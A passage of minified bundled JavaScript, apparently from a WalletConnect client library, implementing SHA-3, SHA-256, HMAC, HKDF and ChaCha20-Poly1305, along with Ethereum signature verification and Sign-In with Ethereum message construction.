Uint32Array([287454020]).buffer)[0]===68;function Rye(r){return r<<24&4278190080|r<<8&16711680|r>>>8&65280|r>>>24&255}function jU(r){for(let e=0;e<r.length;e++)r[e]=Rye(r[e])}function Oye(r){if(typeof r!="string")throw new Error("utf8ToBytes expected string, got "+typeof r);return new Uint8Array(new TextEncoder().encode(r))}function kw(r){return typeof r=="string"&&(r=Oye(r)),aC(r),r}let dR=class{clone(){return this._cloneInto()}};function BQ(r){const e=i=>r().update(kw(i)).digest(),t=r();return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=()=>r(),e}function f4(r=32){if(j2&&typeof j2.getRandomValues=="function")return j2.getRandomValues(new Uint8Array(r));if(j2&&typeof j2.randomBytes=="function")return j2.randomBytes(r);throw new Error("crypto.getRandomValues must be defined")}const MQ=[],DQ=[],LQ=[],Bye=BigInt(0),wb=BigInt(1),Mye=BigInt(2),Dye=BigInt(7),Lye=BigInt(256),Uye=BigInt(113);for(let r=0,e=wb,t=1,i=0;r<24;r++){[t,i]=[i,(2*t+3*i)%5],MQ.push(2*(5*i+t)),DQ.push((r+1)*(r+2)/2%64);let n=Bye;for(let s=0;s<7;s++)e=(e<<wb^(e>>Dye)*Uye)%Lye,e&Mye&&(n^=wb<<(wb<<BigInt(s))-wb);LQ.push(n)}const[jye,Fye]=Iye(LQ,!0),FU=(r,e,t)=>t>32?Nye(r,e,t):Tye(r,e,t),qU=(r,e,t)=>t>32?Pye(r,e,t):kye(r,e,t);function qye(r,e=24){const t=new Uint32Array(10);for(let i=24-e;i<24;i++){for(let o=0;o<10;o++)t[o]=r[o]^r[o+10]^r[o+20]^r[o+30]^r[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=t[c],u=t[c+1],d=FU(l,u,1)^t[a],h=qU(l,u,1)^t[a+1];for(let f=0;f<50;f+=10)r[o+f]^=d,r[o+f+1]^=h}let n=r[2],s=r[3];for(let o=0;o<24;o++){const a=DQ[o],c=FU(n,s,a),l=qU(n,s,a),u=MQ[o];n=r[u],s=r[u+1],r[u]=c,r[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)t[a]=r[o+a];for(let a=0;a<10;a++)r[o+a]^=~t[(a+2)%10]&t[(a+4)%10]}r[0]^=jye[i],r[1]^=Fye[i]}t.fill(0)}let zye=class UQ extends dR{constructor(e,t,i,n=!1,s=24){if(super(),this.blockLen=e,this.suffix=t,this.outputLen=i,this.enableXOF=n,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,Wv(i),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=$ye(this.state)}keccak(){UU||jU(this.state32),qye(this.state32,this.rounds),UU||jU(this.state32),this.posOut=0,this.pos=0}update(e){Tw(this);const{blockLen:t,state:i}=this;e=kw(e);const n=e.length;for(let s=0;s<n;){const o=Math.min(t-this.pos,n-s);for(let a=0;a<o;a++)i[this.pos++]^=e[s++];this.pos===t&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:t,pos:i,blockLen:n}=this;e[i]^=t,t&128&&i===n-1&&this.keccak(),e[n-1]^=128,this.keccak()}writeInto(e){Tw(this,!1),aC(e),this.finish();const t=this.state,{blockLen:i}=this;for(let n=0,s=e.length;n<s;){this.posOut>=i&&this.keccak();const o=Math.min(i-this.posOut,s-n);e.set(t.subarray(this.posOut,this.posOut+o),n),this.posOut+=o,n+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return Wv(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(OQ(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:t,suffix:i,outputLen:n,rounds:s,enableXOF:o}=this;return e||(e=new UQ(t,i,n,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=i,e.outputLen=n,e.enableXOF=o,e.destroyed=this.destroyed,e}};const Wye=(r,e,t)=>BQ(()=>new zye(e,r,t)),Hye=Wye(1,136,256/8),Vye="https://rpc.walletconnect.org/v1";function jQ(r){const e=`Ethereum Signed Message:
${r.length}`,t=new TextEncoder().encode(e+r);return"0x"+Buffer.from(Hye(t)).toString("hex")}async function Kye(r,e,t,i,n,s){switch(t.t){case"eip191":return Gye(r,e,t.s);case"eip1271":return await Zye(r,e,t.s,i,n,s);default:throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${t.t}`)}}function Gye(r,e,t){return V5e(jQ(e),t).toLowerCase()===r.toLowerCase()}async function Zye(r,e,t,i,n,s){const o=nw(i);if(!o.namespace||!o.reference)throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${i}`);try{const a="0x1626ba7e",c="0000000000000000000000000000000000000000000000000000000000000040",l="0000000000000000000000000000000000000000000000000000000000000041",u=t.substring(2),d=jQ(e).substring(2),h=a+d+c+l+u,f=await fetch(`${s||Vye}/?chainId=${i}&projectId=${n}`,{method:"POST",body:JSON.stringify({id:Yye(),jsonrpc:"2.0",method:"eth_call",params:[{to:r,data:h},"latest"]})}),{result:p}=await f.json();return p?p.slice(0,a.length).toLowerCase()===a.toLowerCase():!1}catch(a){return console.error("isValidEip1271Signature: ",a),!1}}function Yye(){return Date.now()+Math.floor(Math.random()*1e3)}var Jye=Object.defineProperty,Qye=Object.defineProperties,Xye=Object.getOwnPropertyDescriptors,zU=Object.getOwnPropertySymbols,e4e=Object.prototype.hasOwnProperty,t4e=Object.prototype.propertyIsEnumerable,WU=(r,e,t)=>e in r?Jye(r,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):r[e]=t,r4e=(r,e)=>{for(var t in e||(e={}))e4e.call(e,t)&&WU(r,t,e[t]);if(zU)for(var t of zU(e))t4e.call(e,t)&&WU(r,t,e[t]);return r},i4e=(r,e)=>Qye(r,Xye(e));const n4e="did:pkh:",hR=r=>r?.split(":"),s4e=r=>{const e=r&&hR(r);if(e)return r.includes(n4e)?e[3]:e[1]},_k=r=>{const e=r&&hR(r);if(e)return e[2]+":"+e[3]},c7=r=>{const e=r&&hR(r);if(e)return e.pop()};async function HU(r){const{cacao:e,projectId:t}=r,{s:i,p:n}=e,s=FQ(n,n.iss),o=c7(n.iss);return await Kye(o,s,i,_k(n.iss),t)}const FQ=(r,e)=>{const t=`${r.domain} wants you to sign in with your Ethereum account:`,i=c7(e);if(!r.aud&&!r.uri)throw new Error("Either `aud` or `uri` is required to construct the message");let n=r.statement||void 0;const s=`URI: ${r.aud||r.uri}`,o=`Version: ${r.version}`,a=`Chain ID: ${s4e(e)}`,c=`Nonce: ${r.nonce}`,l=`Issued At: ${r.iat}`,u=r.exp?`Expiration Time: ${r.exp}`:void 0,d=r.nbf?`Not Before: ${r.nbf}`:void 0,h=r.requestId?`Request ID: ${r.requestId}`:void 0,f=r.resources?`Resources:${r.resources.map(g=>`
- ${g}`).join("")}`:void 0,p=a9(r.resources);if(p){const g=Hv(p);n=p4e(n,g)}return[t,i,"",n,"",s,o,a,c,l,u,d,h,f].filter(g=>g!=null).join(`
`)};function o4e(r){return Buffer.from(JSON.stringify(r)).toString("base64")}function a4e(r){return JSON.parse(Buffer.from(r,"base64").toString("utf-8"))}function J1(r){if(!r)throw new Error("No recap provided, value is undefined");if(!r.att)throw new Error("No `att` property found");const e=Object.keys(r.att);if(!(e!=null&&e.length))throw new Error("No resources found in `att` property");e.forEach(t=>{const i=r.att[t];if(Array.isArray(i))throw new Error(`Resource must be an object: ${t}`);if(typeof i!="object")throw new Error(`Resource must be an object: ${t}`);if(!Object.keys(i).length)throw new Error(`Resource object is empty: ${t}`);Object.keys(i).forEach(n=>{const s=i[n];if(!Array.isArray(s))throw new Error(`Ability limits ${n} must be an array of objects, found: ${s}`);if(!s.length)throw new Error(`Value of ${n} is empty array, must be an array with objects`);s.forEach(o=>{if(typeof o!="object")throw new Error(`Ability limits (${n}) must be an array of objects, found: ${o}`)})})})}function c4e(r,e,t,i={}){return t?.sort((n,s)=>n.localeCompare(s)),{att:{[r]:l4e(e,t,i)}}}function l4e(r,e,t={}){e=e?.sort((n,s)=>n.localeCompare(s));const i=e.map(n=>({[`${r}/${n}`]:[t]}));return Object.assign({},...i)}function qQ(r){return J1(r),`urn:recap:${o4e(r).replace(/=/g,"")}`}function Hv(r){const e=a4e(r.replace("urn:recap:",""));return J1(e),e}function u4e(r,e,t){const i=c4e(r,e,t);return qQ(i)}function d4e(r){return r&&r.includes("urn:recap:")}function h4e(r,e){const t=Hv(r),i=Hv(e),n=f4e(t,i);return qQ(n)}function f4e(r,e){J1(r),J1(e);const t=Object.keys(r.att).concat(Object.keys(e.att)).sort((n,s)=>n.localeCompare(s)),i={att:{}};return t.forEach(n=>{var s,o;Object.keys(((s=r.att)==null?void 0:s[n])||{}).concat(Object.keys(((o=e.att)==null?void 0:o[n])||{})).sort((a,c)=>a.localeCompare(c)).forEach(a=>{var c,l;i.att[n]=i4e(r4e({},i.att[n]),{[a]:((c=r.att[n])==null?void 0:c[a])||((l=e.att[n])==null?void 0:l[a])})})}),i}function p4e(r="",e){J1(e);const t="I further authorize the stated URI to perform the following actions on my behalf: ";if(r.includes(t))return r;const i=[];let n=0;Object.keys(e.att).forEach(a=>{const c=Object.keys(e.att[a]).map(d=>({ability:d.split("/")[0],action:d.split("/")[1]}));c.sort((d,h)=>d.action.localeCompare(h.action));const l={};c.forEach(d=>{l[d.ability]||(l[d.ability]=[]),l[d.ability].push(d.action)});const u=Object.keys(l).map(d=>(n++,`(${n}) '${d}': '${l[d].join("', '")}' for '${a}'.`));i.push(u.join(", ").replace(".,","."))});const s=i.join(" "),o=`${t}${s}`;return`${r?r+" ":""}${o}`}function VU(r){var e;const t=Hv(r);J1(t);const i=(e=t.att)==null?void 0:e.eip155;return i?Object.keys(i).map(n=>n.split("/")[1]):[]}function KU(r){const e=Hv(r);J1(e);const t=[];return Object.values(e.att).forEach(i=>{Object.values(i).forEach(n=>{var s;(s=n?.[0])!=null&&s.chains&&t.push(n[0].chains)})}),[...new Set(t.flat())]}function a9(r){if(!r)return;const e=r?.[r.length-1];return d4e(e)?e:void 0}function jS(r){if(!Number.isSafeInteger(r)||r<0)throw new Error("positive integer expected, got "+r)}function zQ(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function sc(r,...e){if(!zQ(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function GU(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function g4e(r,e){sc(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}function ZU(r){if(typeof r!="boolean")throw new Error(`boolean expected, not ${r}`)}const zf=r=>new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength/4)),m4e=r=>new DataView(r.buffer,r.byteOffset,r.byteLength),w4e=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;if(!w4e)throw new Error("Non little-endian hardware is not supported");function b4e(r){if(typeof r!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(r))}function Sk(r){if(typeof r=="string")r=b4e(r);else if(zQ(r))r=Ak(r);else throw new Error("Uint8Array expected, got "+typeof r);return r}function v4e(r,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(r,e)}function y4e(r,e){if(r.length!==e.length)return!1;let t=0;for(let i=0;i<r.length;i++)t|=r[i]^e[i];return t===0}const x4e=(r,e)=>{function t(i,...n){if(sc(i),r.nonceLength!==void 0){const l=n[0];if(!l)throw new Error("nonce / iv required");r.varSizeNonce?sc(l):sc(l,r.nonceLength)}const s=r.tagLength;s&&n[1]!==void 0&&sc(n[1]);const o=e(i,...n),a=(l,u)=>{if(u!==void 0){if(l!==2)throw new Error("cipher output not supported");sc(u)}};let c=!1;return{encrypt(l,u){if(c)throw new Error("cannot encrypt() twice with same key + nonce");return c=!0,sc(l),a(o.encrypt.length,u),o.encrypt(l,u)},decrypt(l,u){if(sc(l),s&&l.length<s)throw new Error("invalid ciphertext length: smaller than tagLength="+s);return a(o.decrypt.length,u),o.decrypt(l,u)}}}return Object.assign(t,r),t};function YU(r,e,t=!0){if(e===void 0)return new Uint8Array(r);if(e.length!==r)throw new Error("invalid output length, expected "+r+", got: "+e.length);if(t&&!C4e(e))throw new Error("invalid output, must be aligned");return e}function JU(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s);r.setUint32(e+4,o,i),r.setUint32(e+0,a,i)}function C4e(r){return r.byteOffset%4===0}function Ak(r){return Uint8Array.from(r)}function Nw(...r){for(let e=0;e<r.length;e++)r[e].fill(0)}const WQ=r=>Uint8Array.from(r.split("").map(e=>e.charCodeAt(0))),E4e=WQ("expand 16-byte k"),_4e=WQ("expand 32-byte k"),S4e=zf(E4e),A4e=zf(_4e);function di(r,e){return r<<e|r>>>32-e}function Ik(r){return r.byteOffset%4===0}const Y6=64,I4e=16,HQ=2**32-1,QU=new Uint32Array;function T4e(r,e,t,i,n,s,o,a){const c=n.length,l=new Uint8Array(Y6),u=zf(l),d=Ik(n)&&Ik(s),h=d?zf(n):QU,f=d?zf(s):QU;for(let p=0;p<c;o++){if(r(e,t,i,u,o,a),o>=HQ)throw new Error("arx: counter overflow");const g=Math.min(Y6,c-p);if(d&&g===Y6){const w=p/4;if(p%4!==0)throw new Error("arx: invalid block position");for(let m=0,x;m<I4e;m++)x=w+m,f[x]=h[x]^u[m];p+=Y6;continue}for(let w=0,m;w<g;w++)m=p+w,s[m]=n[m]^l[w];p+=g}}function k4e(r,e){const{allowShortKeys:t,extendNonceFn:i,counterLength:n,counterRight:s,rounds:o}=v4e({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof r!="function")throw new Error("core must be a function");return jS(n),jS(o),ZU(s),ZU(t),(a,c,l,u,d=0)=>{sc(a),sc(c),sc(l);const h=l.length;if(u===void 0&&(u=new Uint8Array(h)),sc(u),jS(d),d<0||d>=HQ)throw new Error("arx: counter overflow");if(u.length<h)throw new Error(`arx: output (${u.length}) is shorter than data (${h})`);const f=[];let p=a.length,g,w;if(p===32)f.push(g=Ak(a)),w=A4e;else if(p===16&&t)g=new Uint8Array(32),g.set(a),g.set(a,16),w=S4e,f.push(g);else throw new Error(`arx: invalid 32-byte key, got length=${p}`);Ik(c)||f.push(c=Ak(c));const m=zf(g);if(i){if(c.length!==24)throw new Error("arx: extended nonce must be 24 bytes");i(w,m,zf(c.subarray(0,16)),m),c=c.subarray(16)}const x=16-n;if(x!==c.length)throw new Error(`arx: nonce must be ${x} or 16 bytes`);if(x!==12){const T=new Uint8Array(12);T.set(c,s?0:12-c.length),c=T,f.push(c)}const S=zf(c);return T4e(r,w,m,S,l,u,d,o),Nw(...f),u}}const Zs=(r,e)=>r[e++]&255|(r[e++]&255)<<8;let N4e=class{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=Sk(e),sc(e,32);const t=Zs(e,0),i=Zs(e,2),n=Zs(e,4),s=Zs(e,6),o=Zs(e,8),a=Zs(e,10),c=Zs(e,12),l=Zs(e,14);this.r[0]=t&8191,this.r[1]=(t>>>13|i<<3)&8191,this.r[2]=(i>>>10|n<<6)&7939,this.r[3]=(n>>>7|s<<9)&8191,this.r[4]=(s>>>4|o<<12)&255,this.r[5]=o>>>1&8190,this.r[6]=(o>>>14|a<<2)&8191,this.r[7]=(a>>>11|c<<5)&8065,this.r[8]=(c>>>8|l<<8)&8191,this.r[9]=l>>>5&127;for(let u=0;u<8;u++)this.pad[u]=Zs(e,16+2*u)}process(e,t,i=!1){const n=i?0:2048,{h:s,r:o}=this,a=o[0],c=o[1],l=o[2],u=o[3],d=o[4],h=o[5],f=o[6],p=o[7],g=o[8],w=o[9],m=Zs(e,t+0),x=Zs(e,t+2),S=Zs(e,t+4),T=Zs(e,t+6),k=Zs(e,t+8),I=Zs(e,t+10),E=Zs(e,t+12),C=Zs(e,t+14);let N=s[0]+(m&8191),L=s[1]+((m>>>13|x<<3)&8191),$=s[2]+((x>>>10|S<<6)&8191),y=s[3]+((S>>>7|T<<9)&8191),A=s[4]+((T>>>4|k<<12)&8191),b=s[5]+(k>>>1&8191),v=s[6]+((k>>>14|I<<2)&8191),_=s[7]+((I>>>11|E<<5)&8191),O=s[8]+((E>>>8|C<<8)&8191),D=s[9]+(C>>>5|n),R=0,P=R+N*a+L*(5*w)+$*(5*g)+y*(5*p)+A*(5*f);R=P>>>13,P&=8191,P+=b*(5*h)+v*(5*d)+_*(5*u)+O*(5*l)+D*(5*c),R+=P>>>13,P&=8191;let B=R+N*c+L*a+$*(5*w)+y*(5*g)+A*(5*p);R=B>>>13,B&=8191,B+=b*(5*f)+v*(5*h)+_*(5*d)+O*(5*u)+D*(5*l),R+=B>>>13,B&=8191;let M=R+N*l+L*c+$*a+y*(5*w)+A*(5*g);R=M>>>13,M&=8191,M+=b*(5*p)+v*(5*f)+_*(5*h)+O*(5*d)+D*(5*u),R+=M>>>13,M&=8191;let W=R+N*u+L*l+$*c+y*a+A*(5*w);R=W>>>13,W&=8191,W+=b*(5*g)+v*(5*p)+_*(5*f)+O*(5*h)+D*(5*d),R+=W>>>13,W&=8191;let K=R+N*d+L*u+$*l+y*c+A*a;R=K>>>13,K&=8191,K+=b*(5*w)+v*(5*g)+_*(5*p)+O*(5*f)+D*(5*h),R+=K>>>13,K&=8191;let q=R+N*h+L*d+$*u+y*l+A*c;R=q>>>13,q&=8191,q+=b*a+v*(5*w)+_*(5*g)+O*(5*p)+D*(5*f),R+=q>>>13,q&=8191;let J=R+N*f+L*h+$*d+y*u+A*l;R=J>>>13,J&=8191,J+=b*c+v*a+_*(5*w)+O*(5*g)+D*(5*p),R+=J>>>13,J&=8191;let le=R+N*p+L*f+$*h+y*d+A*u;R=le>>>13,le&=8191,le+=b*l+v*c+_*a+O*(5*w)+D*(5*g),R+=le>>>13,le&=8191;let ae=R+N*g+L*p+$*f+y*h+A*d;R=ae>>>13,ae&=8191,ae+=b*u+v*l+_*c+O*a+D*(5*w),R+=ae>>>13,ae&=8191;let U=R+N*w+L*g+$*p+y*f+A*h;R=U>>>13,U&=8191,U+=b*d+v*u+_*l+O*c+D*a,R+=U>>>13,U&=8191,R=(R<<2)+R|0,R=R+P|0,P=R&8191,R=R>>>13,B+=R,s[0]=P,s[1]=B,s[2]=M,s[3]=W,s[4]=K,s[5]=q,s[6]=J,s[7]=le,s[8]=ae,s[9]=U}finalize(){const{h:e,pad:t}=this,i=new Uint16Array(10);let n=e[1]>>>13;e[1]&=8191;for(let a=2;a<10;a++)e[a]+=n,n=e[a]>>>13,e[a]&=8191;e[0]+=n*5,n=e[0]>>>13,e[0]&=8191,e[1]+=n,n=e[1]>>>13,e[1]&=8191,e[2]+=n,i[0]=e[0]+5,n=i[0]>>>13,i[0]&=8191;for(let a=1;a<10;a++)i[a]=e[a]+n,n=i[a]>>>13,i[a]&=8191;i[9]-=8192;let s=(n^1)-1;for(let a=0;a<10;a++)i[a]&=s;s=~s;for(let a=0;a<10;a++)e[a]=e[a]&s|i[a];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let o=e[0]+t[0];e[0]=o&65535;for(let a=1;a<8;a++)o=(e[a]+t[a]|0)+(o>>>16)|0,e[a]=o&65535;Nw(i)}update(e){GU(this);const{buffer:t,blockLen:i}=this;e=Sk(e);const n=e.length;for(let s=0;s<n;){const o=Math.min(i-this.pos,n-s);if(o===i){for(;i<=n-s;s+=i)this.process(e,s);continue}t.set(e.subarray(s,s+o),this.pos),this.pos+=o,s+=o,this.pos===i&&(this.process(t,0,!1),this.pos=0)}return this}destroy(){Nw(this.h,this.r,this.buffer,this.pad)}digestInto(e){GU(this),g4e(e,this),this.finished=!0;const{buffer:t,h:i}=this;let{pos:n}=this;if(n){for(t[n++]=1;n<16;n++)t[n]=0;this.process(t,0,!0)}this.finalize();let s=0;for(let o=0;o<8;o++)e[s++]=i[o]>>>0,e[s++]=i[o]>>>8;return e}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}};function P4e(r){const e=(i,n)=>r(n).update(Sk(i)).digest(),t=r(new Uint8Array(32));return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=i=>r(i),e}const $4e=P4e(r=>new N4e(r));function R4e(r,e,t,i,n,s=20){let o=r[0],a=r[1],c=r[2],l=r[3],u=e[0],d=e[1],h=e[2],f=e[3],p=e[4],g=e[5],w=e[6],m=e[7],x=n,S=t[0],T=t[1],k=t[2],I=o,E=a,C=c,N=l,L=u,$=d,y=h,A=f,b=p,v=g,_=w,O=m,D=x,R=S,P=T,B=k;for(let W=0;W<s;W+=2)I=I+L|0,D=di(D^I,16),b=b+D|0,L=di(L^b,12),I=I+L|0,D=di(D^I,8),b=b+D|0,L=di(L^b,7),E=E+$|0,R=di(R^E,16),v=v+R|0,$=di($^v,12),E=E+$|0,R=di(R^E,8),v=v+R|0,$=di($^v,7),C=C+y|0,P=di(P^C,16),_=_+P|0,y=di(y^_,12),C=C+y|0,P=di(P^C,8),_=_+P|0,y=di(y^_,7),N=N+A|0,B=di(B^N,16),O=O+B|0,A=di(A^O,12),N=N+A|0,B=di(B^N,8),O=O+B|0,A=di(A^O,7),I=I+$|0,B=di(B^I,16),_=_+B|0,$=di($^_,12),I=I+$|0,B=di(B^I,8),_=_+B|0,$=di($^_,7),E=E+y|0,D=di(D^E,16),O=O+D|0,y=di(y^O,12),E=E+y|0,D=di(D^E,8),O=O+D|0,y=di(y^O,7),C=C+A|0,R=di(R^C,16),b=b+R|0,A=di(A^b,12),C=C+A|0,R=di(R^C,8),b=b+R|0,A=di(A^b,7),N=N+L|0,P=di(P^N,16),v=v+P|0,L=di(L^v,12),N=N+L|0,P=di(P^N,8),v=v+P|0,L=di(L^v,7);let M=0;i[M++]=o+I|0,i[M++]=a+E|0,i[M++]=c+C|0,i[M++]=l+N|0,i[M++]=u+L|0,i[M++]=d+$|0,i[M++]=h+y|0,i[M++]=f+A|0,i[M++]=p+b|0,i[M++]=g+v|0,i[M++]=w+_|0,i[M++]=m+O|0,i[M++]=x+D|0,i[M++]=S+R|0,i[M++]=T+P|0,i[M++]=k+B|0}const O4e=k4e(R4e,{counterRight:!1,counterLength:4,allowShortKeys:!1}),B4e=new Uint8Array(16),XU=(r,e)=>{r.update(e);const t=e.length%16;t&&r.update(B4e.subarray(t))},M4e=new Uint8Array(32);function ej(r,e,t,i,n){const s=r(e,t,M4e),o=$4e.create(s);n&&XU(o,n),XU(o,i);const a=new Uint8Array(16),c=m4e(a);JU(c,0,BigInt(n?n.length:0),!0),JU(c,8,BigInt(i.length),!0),o.update(a);const l=o.digest();return Nw(s,a),l}const D4e=r=>(e,t,i)=>({encrypt(n,s){const o=n.length;s=YU(o+16,s,!1),s.set(n);const a=s.subarray(0,-16);r(e,t,a,a,1);const c=ej(r,e,t,a,i);return s.set(c,o),Nw(c),s},decrypt(n,s){s=YU(n.length-16,s,!1);const o=n.subarray(0,-16),a=n.subarray(-16),c=ej(r,e,t,o,i);if(!y4e(a,c))throw new Error("invalid tag");return s.set(n.subarray(0,-16)),r(e,t,s,s,1),Nw(c),s}}),VQ=x4e({blockSize:64,nonceLength:12,tagLength:16},D4e(O4e));let KQ=class extends dR{constructor(e,t){super(),this.finished=!1,this.destroyed=!1,uR(e);const i=kw(t);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const n=this.blockLen,s=new Uint8Array(n);s.set(i.length>n?e.create().update(i).digest():i);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return Tw(this),this.iHash.update(e),this}digestInto(e){Tw(this),aC(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:t,iHash:i,finished:n,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=n,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=t._cloneInto(e.oHash),e.iHash=i._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}};const fR=(r,e,t)=>new KQ(r,e).update(t).digest();fR.create=(r,e)=>new KQ(r,e);function L4e(r,e,t){return uR(r),t===void 0&&(t=new Uint8Array(r.outputLen)),fR(r,kw(t),kw(e))}const FS=new Uint8Array([0]),tj=new Uint8Array;function U4e(r,e,t,i=32){if(uR(r),Wv(i),i>255*r.outputLen)throw new Error("Length should be <= 255*HashLen");const n=Math.ceil(i/r.outputLen);t===void 0&&(t=tj);const s=new Uint8Array(n*r.outputLen),o=fR.create(r,e),a=o._cloneInto(),c=new Uint8Array(o.outputLen);for(let l=0;l<n;l++)FS[0]=l+1,a.update(l===0?tj:c).update(t).update(FS).digestInto(c),s.set(c,r.outputLen*l),o._cloneInto(a);return o.destroy(),a.destroy(),c.fill(0),FS.fill(0),s.slice(0,i)}const j4e=(r,e,t,i,n)=>U4e(r,L4e(r,e,t),i,n);function F4e(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s),c=i?4:0,l=i?0:4;r.setUint32(e+c,o,i),r.setUint32(e+l,a,i)}function q4e(r,e,t){return r&e^~r&t}function z4e(r,e,t){return r&e^r&t^e&t}let W4e=class extends dR{constructor(e,t,i,n){super(),this.blockLen=e,this.outputLen=t,this.padOffset=i,this.isLE=n,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=US(this.buffer)}update(e){Tw(this);const{view:t,buffer:i,blockLen:n}=this;e=kw(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(n-this.pos,s-o);if(a===n){const c=US(e);for(;n<=s-o;o+=n)this.process(c,o);continue}i.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===n&&(this.process(t,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Tw(this),OQ(e,this),this.finished=!0;const{buffer:t,view:i,blockLen:n,isLE:s}=this;let{pos:o}=this;t[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>n-o&&(this.process(i,0),o=0);for(let d=o;d<n;d++)t[d]=0;F4e(i,n-8,BigInt(this.length*8),s),this.process(i,0);const a=US(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let d=0;d<l;d++)a.setUint32(4*d,u[d],s)}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:t,buffer:i,length:n,finished:s,destroyed:o,pos:a}=this;return e.length=n,e.pos=a,e.finished=s,e.destroyed=o,n%t&&e.buffer.set(i),e}};const H4e=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),Y0=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),J0=new Uint32Array(64);let V4e=class extends W4e{constructor(){super(64,32,8,!1),this.A=Y0[0]|0,this.B=Y0[1]|0,this.C=Y0[2]|0,this.D=Y0[3]|0,this.E=Y0[4]|0,this.F=Y0[5]|0,this.G=Y0[6]|0,this.H=Y0[7]|0}get(){const{A:e,B:t,C:i,D:n,E:s,F:o,G:a,H:c}=this;return[e,t,i,n,s,o,a,c]}set(e,t,i,n,s,o,a,c){this.A=e|0,this.B=t|0,this.C=i|0,this.D=n|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,t){for(let d=0;d<16;d++,t+=4)J0[d]=e.getUint32(t,!1);for(let d=16;d<64;d++){const 